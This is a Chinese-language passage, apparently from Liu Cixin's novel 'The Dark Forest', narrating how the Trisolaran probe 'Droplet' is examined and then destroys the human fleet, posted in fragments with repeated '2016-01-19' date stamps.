<p>章北海对激动的东方笑了笑，似乎是想平息她的情绪，这时，他看她的眼光变得从未有过的柔和，这使得东方的心绪一阵波动。尽管她一直认为章北海的失败主义思想不可思议，一直怀疑他的叛逃有别的目的，甚至怀疑他精神有问题，但不知为何，仍对他生出一种依恋感。她在很小的时候就离开了父亲——当然对这个时代的孩子来说这是正常的事，父爱已经是一种很古老的东西了，现在她却从这位来自二十一世纪的古代军人身上体会到了这种东西。</p>
<p>章北海说：“东方，我来自一个坎坷的时代，是个现实的人，我只知道敌人还存在着，还在向太阳系逼近，作为军人，知道这一点，就只能后天下之乐而乐了……不要减速，这是我交出控制权的条件，当然，我也只能得到你人格上的保证了。”</p>
<p>“我答应，‘自然选择’号不会减速。”</p>
<p>章北海转身飘到悬浮的操作界面前，调出了权限转移界面，并输入自己的口令，经过一连串的点击后，他关闭了界面。</p>
<p>2016-01-19</p>
<p>透过舷窗，丁仪回望着渐渐远去的舰队阵列。位于阵列一角的“量子”号这时看起来仍很庞大，但与它相邻的下一艘战舰“云”号，小得刚能看出形状，再往远处，阵列中的战舰只是视野中的一排点了。丁仪知道，矩形阵列的长边和宽边分别由一百艘和二十艘战舰组成，还有十余艘战舰处于阵列外的机动状态。但他沿长边数下去，只数到三十艘就看不清了，那已经是六百公里远处。再仰头看与之垂直的矩形短边也是一样，能看清的最远处的战舰只是微弱阳光中一个模糊的光点，很难从群星的背景中把它们分辨出来，只有当所有战舰的发动机启动时，舰队阵列的整体才能被肉眼看到。丁仪感到，联合舰队就是太空中的一个100×20的矩阵，他想象着有另一个矩阵与它进行乘法运算，一个的横行元素与另一个的竖行元素依次相乘生成一个更大的矩阵，但在现实中，与这个庞大矩阵相对的只有一个微小的点：水滴。丁仪不喜欢这种数学上的极端不对称，他这套用于镇静自己的思维体操失败了。当加速的过载消失后，他转头与坐在旁边的西子搭讪。</p>
<p>2016-01-19</p>
<p>西子正凝视着前方，好像在努力寻找仍在几百公里远处的“螳螂”号，她回过神来后摇摇头，“不，丁老，我是在亚洲舰队出生的，名字与杭州有没有关系我也不知道，不过我去过那儿，真是个好地方。</p>
<p>2016-01-19</p>
<p>“我们那时才是好地方，现在，西湖都变成沙漠中的月牙泉了……不过话说回来，虽然到处是沙漠，现在这个世界还是让我想起江南，这时代，美女如水啊。”丁仪说着，看看西子，遥远的太阳的柔光从舷窗透入，勾勒出她迷人的侧影，“孩子，看到你，我想起一个曾经爱过的人，她也是一名少校军官，个子不如你高，但和你一样漂亮……”</p>
<p>2016-01-19</p>
<p>丁老，外部通讯频道还开着呢。”西子心不在焉地提醒道，双眼仍盯着前方的太空。</p>
<p>2016-01-19</p>
<p>那，在古代，您一定被许多女孩子爱上过。”西子收回目光看着丁仪说，一直处于高度紧张的她感到自己也确实需要转移一下注意力了。</p>
<p>“这我不知道，对爱我的女孩子我不感兴趣，感兴趣的是我爱上的那些。”“这个时代，像您这样什么都能顾得上又都做得那么出色的人真是不多了。”</p>
<p>“哦……不不，我一般不会去打扰我爱的那些女孩子，我信奉歌德的说法：我爱你，与你有何相干？”</p>
<p>西子看着丁仪笑而不语。</p>
<p>2016-01-19</p>
<p>丁仪接着说：“唉，我要是对物理学也持这种态度就好了。我一直觉得，此生最大的遗憾就是被智子蒙住了眼睛，其实，豁达些想想：我们探索规律，与规律有何相干？也许有一天，人类或其他什么东西把规律探知到这种程度，不但能够用来改变他们自己的现实，甚至能够改变整个宇宙，能够把所有的星系像面团一样捏成他们需要的形状，但那又怎么样？规律仍然没变，是的，她就在那里，是唯一不可能被改变的存在，永远年轻，就像我们记忆中的爱人……”丁仪说着，指指舷窗外灿烂的银河，“想到这一点，我就看开了。”</p>
<p>2016-01-19</p>
<p>像一滴圣母的眼泪。”西子说。</p>
<p>2016-01-19</p>
<p>她的话以光速从“螳螂”号传出去，先是在舰队，三小时后在整个人类世界引起了共鸣。</p>
<p>2016-01-19</p>
<p>来自欧洲舰队的少校，都是普通人，因意外的机遇在这文明史上的巅峰时刻处于最中心的位置。在这样近的距离上面对水滴，他们都有一个共同的感觉：对那个遥远世界的陌生感消失了，代之以强烈的认同愿望。是的，在这寒冷广漠的宇宙中，同为碳基生命本身就是一种缘分，一种可能要几十亿年才能修得的缘分，这个缘分让人们感受到一种跨越时空的爱。现在，水滴使他们感受到了这种爱，任何敌意的鸿沟都是可以在这种爱中消弭的。西子的眼睛湿润了，三小时后将有几十亿人与她一样热泪盈眶。</p>
<p>2016-01-19</p>
<p>“感觉不到一点儿摩擦力，”中校惊奇地说，“这表面太光滑了。”</p>
<p>“能光滑到什么程度呢？”丁仪问。</p>
<p>为了解答这个问题，西子从航天服的口袋中拿出了一个圆筒状的仪器，那是一架显微镜。她用镜头接触水滴的表面，从仪器所带的一个小显示屏上，可以看到放大后的表面图像。屏幕上所显示的，仍然是光滑的镜面。</p>
<p>“放大倍数是多少？”丁仪问。</p>
<p>“一百倍。”西子指指显微镜显示屏一角的一个数字，同时把放大倍数调到一千倍。</p>
<p>放大后的表面还是光滑的镜面。</p>
<p>“你这东西坏了吧？”中校说。</p>
<p>西子把显微镜从水滴上拿起来，放到自己航天服的面罩上，其他三人凑过来一起看着显示屏，只见被放大一千倍的面罩表面那肉眼看上去与水滴一样光洁的面，在屏幕上变得像乱石滩一样粗糙。西子又把显微镜重新安放在水滴表面上，显示屏上再次出现了光滑的镜面，与周围没有放大的表面无异。</p>
<p>“把倍数再调大十倍。”丁仪说。</p>
<p>这超出了光学放大的能力，西子进行了一连串的操作，把显微镜由光学模式切换到电子隧道显微模式，现在放大倍数是一万倍。</p>
<p>放大后的表面仍是光滑镜面。而人类技术所能加工的最光滑的表面，只放大上千倍后其粗糙就暴露无遗，正像格利弗眼中的巨人美女的脸。</p>
<p>2016-01-19</p>
<p>调到十万倍。”中校说。他们看到的仍是光滑镜面。</p>
<p>“一百万倍。”</p>
<p>光滑镜面。</p>
<p>“一千万倍！”</p>
<p>在这个放大倍数下，已经可以看到大分子了，但屏幕上显示的仍是光滑镜面，看不到一点儿粗糙的迹象，其光洁度与周围没有被放大的表面毫无区别。</p>
<p>“再把倍数调大些！”</p>
<p>西子摇摇头，这已经是电子显微镜所能达到的极值了。</p>
<p>2016-01-19</p>
<p>两个多世纪前，阿瑟·克拉克在他的科幻小说《2001：太空奥德赛》中描述了一个外星超级文明留在月球上的黑色方碑，考察者用普通尺子量方碑的三道边，其长度比例是1:3:9，以后，不管用何种更精确的方式测量，穷尽了地球上测量技术的最高精度，方碑三边的比例仍是精确的1:3:9，没有任何误差。克拉克写道：那个文明以这种方式，狂妄地显示了自己的力量。</p>
<p>2016-01-19</p>
<p>现在，人类正面对着一种更狂妄的力量显</p>
<p>2016-01-19</p>
<p>真有绝对光滑的表面？”西子惊叹道。</p>
<p>“有，”丁仪说，“中子星的表面就几乎绝对光滑。”</p>
<p>2016-01-19</p>
<p>“但是它的质量是很正常的！”</p>
<p>丁仪想了一会儿，向周围看看说：“联系一下飞船的电脑吧，确定一下捕获时机械手的夹具夹在什么位置。”</p>
<p>这事情由舰队的监控人员做了，“螳螂”号的电脑发出了几束极细的红色激光束，在水滴的表面标示出钢爪夹具的接触位置。西子用显微镜观察其中一处的表面，在一千万倍的放大倍率下，看到的仍是光洁无瑕的镜面。</p>
<p>“接触面的压强有多大？”中校问，很快得到了舰队的回答：约每平方厘米两百公斤。</p>
<p>光洁的表面最易被划伤，而水滴被金属夹具强力接触的表面没有留下任何划痕。</p>
<p>2016-01-19</p>
<p>丁仪飘离开去，到舱内寻找着什么，回来时手里拿着一把地质锤，可能是有人在舱内检测岩石样品时丢下的，其他人来不及制止，他已用力把地质锤砸到镜面上！他只听到叮的一声，清脆而悠扬，像砸在玉石构成的大地上，这声音是通过他的身体传来的，由于是真空环境，其他三人听不到。丁仪接着用锤柄的一端指示出被砸的位置，西子立刻用显微镜观察那一点。</p>
<p>一千万的放大倍数下，仍是绝对光滑的镜面。</p>
<p>2016-01-19</p>
<p>“只能猜了。”丁仪抬头说，“这东西的分子，像仪仗队一样整齐地排列着，同时相互固结，知道这种固结有多牢固吗？分子像被钉子钉死一般，自身振动都消失了。”</p>
<p>“这就是它处于绝对零度的原因！”西子说，她和另外两位军官都明白丁仪的话意味着什么：在普通密度的物质中，原子核的间距是很大的，把它们相互固定死，不比用一套连杆把太阳和八大行星固定成一套静止的桁架容易多少。</p>
<p>“什么力才能做到这一点？”</p>
<p>“就一种：强互作用力。”透过面罩可以看到，丁仪的额头上已满是冷汗。</p>
<p>“这……不是等于把弓箭射上月球吗？！”</p>
<p>“他们确实把弓箭射上月球了……圣母的眼泪？嘿嘿……”丁仪发出一阵冷笑，听起来有种令人胆寒的凄厉，三位军官也同样知道这冷笑的含义：水滴不像眼泪那样脆弱，相反，它的强度比太阳系中最坚固的物质还要高百倍，这个世界中的所有物质在它面前都像纸片般脆弱，它可以像子弹穿透奶酪一样穿过地球，表面不受丝毫损伤。</p>
<p>“那……它来干什么？”中校脱口问道。</p>
<p>2016-01-19</p>
<p>谁知道？也许它真是一个使者，但带给人类的是另外一个信息……”丁仪说，同时把目光从水滴上移开。</p>
<p>“什么？”</p>
<p>“毁灭你，与你有何相干？”</p>
<p>这句话带来一阵死寂，就在考察队的另外三名成员和联合舰队中的百万人咀嚼其含义时，丁仪突然说：“快跑。”这两个字是低声说出的，但紧接着，他扬起双手，声嘶力竭地大喊：“傻孩子们，快——跑——啊！”</p>
<p>“向哪儿跑？”西子惊恐地问。</p>
<p>只比丁仪晚了几秒钟，中校也悟出了真相，他像丁仪一样绝望地大喊：“舰队！舰队疏散！”但一切都晚了，这时强干扰已经出现，从“螳螂”号传回的图像扭曲消失了，舰队没能听到中校的最后呼叫。</p>
<p>2016-01-19</p>
<p>在水滴尾部的尖端，出现了一个蓝色的光环，那个光环开始很小，但很亮，使周围的一切笼罩在蓝光中，它急剧扩大，颜色由蓝变黄最后变成红色，仿佛光环不是由水滴产生的，而是刚从环中钻出来一样。光环在扩张的同时光度也在减弱，当它扩张到大约是水滴最大直径的一倍时消失了，在它消失的同时，第二个蓝色小光环在尖端出现了，同第一个一样扩张、变色、光度减弱，并很快消失了。光环就这样从水滴的尾部不断出现和扩张，频率为每秒钟两三次，在光环的推进下，水滴开始移动并急剧加速。</p>
<p>考察队的四个人没有机会看到第二个光环的出现，还在第一个光环出现后，在近似太阳核心的超高温中，他们就都被瞬间汽化了。</p>
<p>2016-01-19</p>
<p>螳螂”号的船体发出红光，从外部看如同纸灯笼里的蜡烛被点燃了一样，同时金属船体像蜡一样熔化——但熔化刚刚开始，飞船就爆炸了。爆炸后的“螳螂”号几乎没有留下固体残片，船体金属全部变成白炽的液态在太空中飞散开来。</p>
<p>2016-01-19</p>
<p>舰队清晰地观察到了一千公里外“螳螂”号的爆炸，所有人的第一反应是水滴自毁了，他们首先为考察队四人的牺牲而悲伤，然后对水滴并非和平使者感到失望。不过对即将发生的事情，全人类都没有做好最起码的心理准备。</p>
<p>2016-01-19</p>
<p>对于这块加速的碎片，舰队太空监测系统只发出了一个三级攻击警报，因为它不是正对舰队而来，而是向矩形阵列的一个角飞去，按照目前的运行方向，将从阵列外掠过，不会击中舰队的任何目标。在“螳螂”号爆炸同时引发的大量一级警报中，这个三级警报被完全忽略了。但计算机也注意到了这块碎片极高的加速度，在飞出三百公里时，它已经超过了第三宇宙速度，而且加速还在继续。于是警报级别被提升至二级，但仍被忽略。碎片从爆炸点到阵列一角共飞行了约一千五百公里，耗时约五十秒钟，当它到达阵列一角时，速度已经达到31.7公里/秒，这时它处于阵列外围，距处于矩形这一角的第一艘战舰“无限边疆”号一百六十公里。碎片没有从那里掠过阵列，而是拐了一个三十度的锐角，速度丝毫未减，直冲“无限边疆”号而来。在它用两秒钟左右的时间飞过这段距离时，计算机居然把对碎片的二级警报又降到了三级，按照它的推理，这块碎片不是一个有质量的实体，因为它完成了一次从宇航动力学上看根本不可能的运动：在两倍于第三宇宙速度的情况下进行这样一个不减速的锐角转向，几乎相当于以同样的速度撞上一堵铁墙，如果这是一个航行器，它的内部放着一块金属，那这次转向所产生的过载会在瞬间把金属块压成薄膜。所以，碎片只能是个幻影。</p>
<p>2016-01-19</p>
<p>就这样，水滴以第三宇宙速度的两倍向“无限边疆”号冲去，它此时的航向延长线与舰队矩形阵列的第一列重合。</p>
<p>水滴撞击了“无限边疆”号后三分之一处，并穿过了它，就像毫无阻力地穿过一个影子。由于撞击的速度极快，舰体在水滴撞进和穿出的位置只出现了两个十分规则的圆洞，其直径与水滴最粗处相当。但圆洞刚一出现就变形消失，因为周围的舰壳都由于高速撞击产生的热量和水滴推进光环的超高温而熔化了，被击中的这一段舰体很快处于红炽状态，这种红炽由撞击点向外蔓延，很快覆盖了“无限边疆”号的二分之一，这艘巨舰仿佛是刚刚从煅炉中取出的一个大铁块。</p>
<p>2016-01-19</p>
<p>穿过“无限边疆”号的水滴继续以约每秒三十公里的速度飞行，在三秒钟内飞过了九十公里的距离，首先穿透了矩形阵列第一列上与“无限边疆”号相邻的“远方”号，接着穿透了“雾角”号、“南极洲”号和“极限”号，它们的舰体立刻都处于红炽状态，像是舰队第一队列中按顺序亮起的一排巨灯。</p>
<p>“无限边疆”号的大爆炸开始了。与其后被穿透的其他战舰一样，它的舰体被击中的位置是聚变燃料舱，与“螳螂”号在高温中发生的常规爆炸不同，“无限边疆”号的部分核燃料被引发核聚变反应，人们一直不知道，聚变反应是被水滴推进光环的超高温还是被其他因素引发。热核爆炸的火球在被撞击处出现后，迅速扩张，整个舰队都被强光照亮，在黑天鹅绒般的太空背景上凸现出来，银河系的星海黯然失色。</p>
<p>2016-01-19</p>
<p>核火球也相继在“远方号”、“雾角”号、“南极洲”号和“极限”号上出现。</p>
<p>2016-01-19</p>
<p>在接下来的八秒钟内，水滴又穿透了十艘恒星级战舰。</p>
<p>2016-01-19</p>
<p>这时，膨胀的核火球已经吞没了“无限边疆”号的整个舰体，然后开始收缩。同时，核火球在更多被击穿的战舰上亮起并膨胀。</p>
<p>水滴继续在矩形阵列的长边上飞行，以不到一秒的间隔，穿透一艘又一艘恒星级战舰。</p>
<p>2016-01-19</p>
<p>这时，在第一个被击穿的“无限边疆”号上，核聚变的火球已经熄灭，被彻底熔化的舰体爆发开来，百万吨发着暗红色光芒的金属液放射状地迸射，像怒放的花蕾，熔化的金属在太空中毫无阻力地飞散，在所有的方向上形成炽热的“金属岩浆”暴雨。</p>
<p>水滴继续前进，沿直线贯穿更多的战舰，在它的身后，一直有十个左右的核火球在燃烧，在这些炽热的小太阳的光焰中，整个舰队阵列也像被点燃了一般熠熠闪耀，成为一片光的海洋。在火球队列的后方，熔化的战舰相继迸射开来，金属液炽热的波涛在太空中汹涌扩散，如同在岩浆的海洋中投入了一块块巨石。</p>
<p>2016-01-19</p>
<p>水滴用了一分钟十八秒飞完两千公里的路程，贯穿了联合舰队矩形阵列第一队列中的一百艘战舰。</p>
<p>2016-01-19</p>
<p>当第一队列的最后一艘战舰“亚当”号被核火球吞噬时，在队列的另一端，迸射的金属岩浆已经因扩散和冷却变得稀疏。爆发的核心，也就是一分多钟前“无限边疆”号所在的位置，几乎变得空无一物了。“远方号”、“雾角”号、“南极洲”号、“极限”号……都相继化为飞散的金属岩浆消失了。当这个队列中最后一个核火球熄灭后，太空再次黑暗下来，飞散中渐渐冷却的金属岩浆本来已经看不清，在太空暗下来后，它们暗红色的光芒再次显现，像一条两千公里长的血河。</p>
<p>2016-01-19</p>
<p>水滴在击穿了第一队列最后一艘战舰“亚当”号后，向前方空荡的太空飞行了约八十公里的一小段，再次做出了那个人类宇航动力学无法解释的锐角转向，这一次转向的角度比上一次更小，约为十五度，几乎是突然掉头反向飞行，同时保持速度不变，然后再经过一次较小的方向调整，航向与舰队矩形阵列的第二列（如果考虑刚刚完成的毁灭，这已经是第一列了）直线重合，以30公里/秒的速度向该队列这个方向的第一艘战舰“恒河”号冲去。</p>
<p>直到这时，联合舰队的指挥系统还没有做出任何反应。</p>
<p>2016-01-19</p>
<p>舰队的战场信息系统忠实地完成了自己的使命，通过庞大的监测网完整地记录了前一分十八秒的战场信息，这批信息数量巨大，在短时间内只能由计算机战场决策系统来进行分析，最后得出了这样的结论：</p>
<p>在附近空间出现了强大的敌方太空力量，并对我方舰队发起攻击，但计算机没有给出这种力量的任何信息，能确定的只有两点：一、敌太空力量处于水滴所在方位；二、这种力量对我方所有探测手段都是隐形的。</p>
<p>2016-01-19</p>
<p>这时，舰队的指挥官们都处于一种震颤麻木状态中，在过去长达两个世纪的太空战略和战术研究中，设想过各种极端的战场情况，但目睹一百艘战舰像一挂鞭炮似的在一分钟内炸完，还是超出了他们的心理承受能力。面对着从战场信息系统潮水般汹涌而来的信息，他们只能依赖计算机战场决策系统的分析和判断，把注意力集中到对那个并不存在的敌方隐形舰队的探测上，大量的战场监测力量开始把视线投向远方的太空深处，而忽略了眼前的危险。甚至还有相当多的人认为，这个强大的隐形敌人可能是人类与三体之外的第三方外星力量，因为三体世界在他们的潜意识中已经是一个弱小的失败者了。</p>
<p>2016-01-19</p>
<p>舰队的战场监测系统没有尽早发现水滴的存在，主要原因在于水滴对所有波长的雷达都是隐形的，因而只能从对可见光波段的图像的分析才能发现它，但在太空战场的监测信息中，可见光图像信息远不如雷达信息受重视。攻击发生时，太空中飞散着暴雨般的爆炸碎片，这些碎片大多是核爆高温中熔化的液态金属，它们从爆炸中飞出的时候大部分也呈液滴状，每艘战舰毁灭时熔化的金属达百万吨，形成巨量的液态碎片，其中相当一部分的大小和形状都与水滴相当，所以计算机图像分析系统很难把水滴从巨量碎片中分辨出来，更何况几乎所有指挥官都认为水滴已经在“螳螂”号中自毁，并没有发出专门的指令让系统做这样的分析。</p>
<p>2016-01-19</p>
<p>与此同时，另外的一些情况也加剧了战场的混乱。第一队列战舰爆炸迸射出的碎片很快到达第二队列，各舰的战场防御系统随即做出了反应，开始用高能激光和电磁炮拦截碎片。飞来的碎片主要是被核火球烧熔的金属，它们大小不一，在飞行途中已经被太空中的低温部分冷却，但冷却变硬的只是一层外壳，里面还是炽热的液态，被击中后像焰火一样灿烂地飞散。很快，在第二队列和已经毁灭的第一队列留下的黯淡“血河”之间，形成了一道平行的焰火屏障，它疯狂地爆发着翻滚着，像是从那看不见的敌人的方向涌来的火海大潮。飞散的碎片如冰雹般密集，防御系统并不能完全拦截它们，相当一部分碎片穿过拦截火力并击中了战舰，这些固液混合的金属射流具有相当的冲击力和破坏力，第二队列中一部分战舰的舰壳受到严重损伤，甚至被击穿，减压警报凄厉地响起……与碎片的炫目的战斗吸引了相当的注意力，这种情况下，指挥系统的计算机和人都难以避免一个错觉：舰队正在和敌方太空力量激烈交火，没有人和电脑注意到那个即将开始毁灭第二队列的小小的死神。</p>
<p>2016-01-19</p>
<p>所以，当水滴冲向“恒河”号时，第二队列的一百艘战舰仍然排成一条直线，这是死亡的队形</p>
<p>2016-01-19</p>
<p>水滴闪电般冲来，在短短的十秒钟内，它就击穿了“恒河”号、“哥伦比亚”号、“正义”号、“马萨达”号、“质子”号、“炎帝”号、“大西洋”号、“天狼”号、“感恩节”号、“前进”号、“汉”号和“暴风雨”号十二艘恒星级巨舰。同第一队列中的毁灭一样，每艘战舰在被穿透后先是变成红炽状态，然后被核聚变火球吞噬，火球熄灭后，被熔化的战艘便化做百万吨发着暗红色光芒的金属岩浆爆发开来。在这惨烈的毁灭中，直线排列的战舰队列就像一根被点燃的长达两千公里的导火索，在剧烈的燃烧后，留下一条发着暗红色余光的灰烬带。</p>
<p>2016-01-19</p>
<p>一分二十一秒后，第二队列的一百艘战舰也被全部摧毁。</p>
<p>2016-01-19</p>
<p>在击穿第二队列的最后一艘战舰“明治”号后，水滴冲过队列的末端，又以一个锐角回转冲向第三队列的队首“牛顿”号。在第二队列被毁灭的过程中，爆炸碎片向第三队列汹涌而来，这道碎片浪潮中，包括第二队列爆炸后仍处于熔融状态的金属液和从第一队列飞来的大部分已经冷凝的金属碎块，在防御系统启动的同时，第三队列中的大部分战舰已经启动发动机，开始机动。所以在这时，与被毁灭前的第一、二队列不同，第三队列已经不是一条直线，但这个队列的一百艘战舰大体上仍排成一列。水滴穿透了“牛顿”号后，急剧调整方向，瞬间飞越二十公里的距离穿透了与“牛顿”号错开三公里位置的“启蒙”号，从“启蒙”号穿出的水滴再次急转，冲向已经机动到队列主线另一侧的“白垩纪”号并穿透了它。水滴就这样沿一条折线飞行，击穿第三队列中一艘又一艘战舰，在折线飞行中水滴的速度丝毫不减，仍为约每秒三十公里。后来的分析者在察看这条航线时震惊地发现，水滴的每一次转向都是一个尖锐的折角，而不是像人类的太空飞行器那样成一段平滑曲线，这种魔鬼般的飞行展示了一种完全在人类理解力之外的太空驱动方式，这种驱动之下的水滴仿佛是一个没有质量的影子，像上帝的笔尖一样可以不理会动力学原理随意运动。在毁灭第三队列的过程中，这种急剧的转向以每秒钟两到三次的频率进行，水滴就像一枚死神的绣花针，灵巧地上下翻飞，用一条毁灭的折线把第三队列的一百艘战舰贯穿起来。</p>
<p>水滴毁灭第三队列用了两分三十五秒。</p>
<p>2016-01-19</p>
<p>这时，舰队中所有战舰的发动机都已启动，矩形阵列已经完全打乱，水滴仍继续攻击开始疏散的战舰，毁灭的速度慢了下来，但每时每刻都有三到五个核火球在舰群中燃烧，在它们的死亡光焰下，战舰发动机的光芒黯然失色，像一群惊恐的萤火虫。</p>
<p>2016-01-19</p>
<p>李维：你好！知道你还活着我很高兴！</p>
<p>赵鑫：上尉，是这样，我有一个发现，想上传到指挥共享层次，但权限不够，你帮帮忙吧！</p>
<p>李维：我权限也不够，不过现在指挥共享层次的信息肯定够多的了，你想传什么？</p>
<p>赵鑫：我分析了战场可见光图像……</p>
<p>李维：你应该在忙着分析雷达信息吧？</p>
<p>赵鑫：这正是系统的谬误所在，我首先分析了可见光图像，只抽取速度特征，你知道发现了什么？你知道现在发生的是什么事儿吗？</p>
<p>李维：好像你知道？</p>
<p>赵鑫：你别以为我疯了，我们是朋友，你了解我。</p>
<p>李维：你是个冷血动物，肯定是后天下之疯而疯，说吧。</p>
<p>赵鑫：告诉你，舰队疯了，我们在自己打自己呀！</p>
<p>李维：……</p>
<p>赵鑫：“无限边疆”号击毁“远方号”、“远方号”击毁“雾角”号、“雾角”号击毁“南极洲”号，“南极洲”号……</p>
<p>李维：你他妈真的疯了！</p>
<p>赵鑫：就这样A攻击B、B被击中后在爆炸前攻击C、C被击中后在爆炸前攻击D……每一艘被击中的战舰就像受了传染似的攻击队列中的下一艘，他妈的，死亡击鼓传花，真疯了！</p>
<p>李维：用的是什么武器？</p>
<p>赵鑫：我不知道，我从图像中抽取出了一种发射体，贼小贼快，比你的电磁炮弹都他妈快，而且很准的，每次都击中燃料箱！</p>
<p>2016-01-19</p>
<p>李维：我注意到了速度。</p>
<p>赵鑫：什么速度？</p>
<p>李维：就是那个小发射体的速度，它比每艘战舰发射时的速度稍低一些，然后在飞行中加速到每秒三十公里，击中下一艘战舰，这艘战舰在爆炸前发射的这东西速度又低了一些，然后再加速……</p>
<p>赵鑫：这没什么吧……</p>
<p>李维：我想说的是……这有点儿像阻力。</p>
<p>赵鑫：阻力？什么意思？</p>
<p>李维：这个发射体在每次穿透目标时受到阻力降低了它的速度。</p>
<p>赵鑫：……我注意到你的话了，我不笨，你说这个发射体，你说穿透目标……发射体是同一个？</p>
<p>李维：还是看看外边吧，又有一百艘战舰爆炸了。</p>
<p>……</p>
<p>2016-01-19</p>
<p>这段对话用的不是现代舰队语，而是二十一世纪的汉语，从说话方式中也能听出他们都是冬眠者。在三大舰队中服役的冬眠者数量很少，且都是在岁数很小时苏醒的，即使这样，他们对知识的接受能力也不如现代人，所以大多在舰队中担任较低的职务。人们后来发现，在这场大毁灭中，在最早恢复冷静并做出正确判断的指挥官和士兵中，冬眠者占了很大的比例。以这两名军官为例，以他们的级别甚至无权使用舰上的高级分析系统，却做出了如此卓越的分析判断。</p>
<p>2016-01-19</p>
<p>在被图像分析软件抽取出的图像中，除了尾部的推进光环，水滴没有什么变化，仍是完美的液滴外形，只是它的镜面在高速运动中映射着核火球和金属岩浆的光芒，强光和暗红频繁交替，仿佛是燃烧的血滴。进一步的分析描绘出了水滴的攻击路线。</p>
<p>2016-01-19</p>
<p>在两个世纪的太空战略研究中，人们曾设想过末日之战的各种可能。在战略家的脑海里，敌人的影像总是宏大的，人类在太空战场上所面对的是浩荡的三体主力舰队，每艘战舰都是一座小城市大小的死亡堡垒。对敌人所有可能的极端武器和战术都有构想，其中最令人恐惧的莫过于三体舰队可能发动的反物质武器攻击，一粒步枪子弹大小的反物质就足以毁灭一艘恒星级战舰。</p>
<p>2016-01-19</p>
<p>但现在，联合舰队却面对这样一个事实：唯一的敌人就是一个小小的探测器，这是从三体实力海洋中溅出的一滴水，而这滴水的攻击方式，只是人类海军曾使用过的最古老原始的战术——撞击。</p>
<p>2016-01-19</p>
<p>从水滴开始攻击到舰队统帅部做出正确判断，大约经过了十三分钟时间，面对如此复杂严酷的战场环境，这是相当迅速的了，但水滴的攻击更为神速。在二十世纪的海战中，当敌方舰队出现在海天一线时，甚至有时间把所有舰长召集到旗舰来开一次会，但太空战场是以秒来计时的，就在这十三分钟里，已有六百多艘战舰被水滴消灭。直到这时人们才明白，太空战争的指挥远非人力所能及，而由于智子的阻碍，人类的人工智能不可能达到指挥太空战争的水平，所以，仅从指挥层面上看，人类也可能永远不会具备与三体力量进行太空战的能力。</p>
<p>2016-01-19</p>
<p>由于水滴攻击的迅猛和对雷达隐形，被攻击的战舰的防御系统一直没有做出反应。但随着战舰间距的拉开，水滴的攻击距离也随之加长，同时所有战舰的防御系统也根据水滴的目标特征进行了重新设定，在“纳尔逊”号受到攻击时，该舰首次对水滴实施了拦截。为了提高对小型高速目标的打击精度，拦截使用了激光武器。当被多道激光击中时，水滴发出超强的光芒。舰载激光武器均发射伽马射线激光，这种激光在视觉上是看不到的，但水滴在反射时却把它变成了可见光。人们对水滴的雷达隐形一直迷惑不解，因为它拥有全反射的表面和完美的散射形状，也许，这种对电磁波的变频反射能力就是它隐形的秘密。水滴被击中时发光的亮度甚至使周围的核火球也变得黯淡，所有监视系统都为避免光学部分被强光损坏而调暗了图像，肉眼直视水滴会造成长时间的失明。当超强的光芒降临时，也就与黑暗无异。水滴就带着这吞没一切的光芒穿透了“纳尔逊”号，当它的光芒熄灭时，太空战场似乎陷入漆黑之中。稍后，核聚变的火焰才再次显示它的威力。从“纳尔逊”号中穿出的水滴仍完好无损，径直冲向八十多公里外的“绿”号。</p>
<p>2016-01-19</p>
<p>“绿”号的防御系统改变了拦截武器，使用电磁动能武器向来袭的水滴射击。电磁炮发射的金属弹具有巨大的破坏力，由于其高速所带的巨大动能，每颗金属弹在击中目标时都相当于一颗重磅炸弹，在对行星的地面目标进行连发射击时，很快就能扫平一座山峰。由于与水滴的相对速度叠加，金属弹具有更大的动能，但在击中水滴时，只是减慢了它的速度。水滴立刻调整推进力，很快恢复速度，顶着密集的弹雨向“绿”号飞去并穿透了它。这时，如果用超高倍数的显微镜观察水滴表面，看到的仍是绝对光洁的镜面，没有一丝划痕。</p>
<p>2016-01-19</p>
<p>强互作用力构成的材料与普通物质在强度上的差别，就如同固体与液体的差别一样，人类武器对水滴的攻击，如同海浪冲击礁石，不可能对目标造成任何破坏，水滴在太阳系如入无人之境，这个世界没有任何东西可以摧毁它。</p>
<p>2016-01-19</p>
<p>刚刚稳定下来的舰队指挥系统再次陷入混乱，这次是由于所有作战手段失效产生的绝望所引发的崩溃，很难再恢复了。</p>
<p>2016-01-19</p>
<p>太空中的无情杀戮在继续，随着舰群间距的拉大，水滴迅速加速，很快把自己的速度增加了一倍，达到60公里/秒。在不间断的攻击中，水滴显示了它冷酷而精确的智慧。在一定的区域内，它完美地解决了邮差问题，攻击路线几乎不重复。在目标位置不断移动的情况下做到这一点，需要全方位的精确测量和复杂的计算，而这些，水滴都在高速运动中不动声色地完成了。但有时，它也会从一个区域专心致志的屠杀中突然离开，奔向舰群的边缘，迅速消灭已经脱离总舰群的一些战舰，在这样做的同时，会把舰群朝这个方向逃离的趋势遏止住。由于已经来不及进入深海状态，所有战舰只能以“前进三”的加速度疏散，舰群不可能很快散开，水滴不时地在舰群边缘的不同位置进行这样的拦阻攻击，就像一只迅猛的牧羊犬奔跑着维持羊群的队形。</p>
<p>2016-01-19</p>
<p>在被水滴击穿的战舰中，以穿孔为中心的一段舰体会立刻处于红炽状态，但也只是三至五秒的时间，核燃料的聚变爆炸很快发生，在被核火球吞没的战舰中，一切生命都在瞬间汽化。但这只是就攻击中的一般情况而言，水滴一般都能准确地击中战舰的燃料舱，它是靠实时检测燃料舱的位置，还是本身就存贮着由智子提供的所有战舰的结构数据库，不得而知。</p>
<p>2016-01-19</p>
<p>对于大约十分之一的目标，水滴并没有击中燃料舱，在目标毁灭的整个过程中，核燃料不会发生聚变，战舰由红炽状态到发生常规爆炸要经历相当长的一段时间，这是最残酷的情况，战舰内部的人员会在高温中挣扎，直到被烤焦后死亡。</p>
<p>2016-01-19</p>
<p>舰队的疏散并不顺利。这时，空间中已经充满了冷凝后或仍处于熔融状态的碎片，以及大块的舰体残骸，战舰在飞行中，舰上防御系统要用激光或电磁动能弹不停地摧毁航行方向上的这些东西，由于碎片都是在距战舰大致相同的距离上被击中，就在前方形成了一个由闪光和焰火构成的弧面，战舰仿佛顶着一个灿烂的华盖在飞行。但总是有相当数量的碎片漏过防御系统直接撞击战舰，对舰体造成严重损伤，甚至使一些战舰失去航行能力，与大块残骸的相撞更是致命的。</p>
<p>2016-01-19</p>
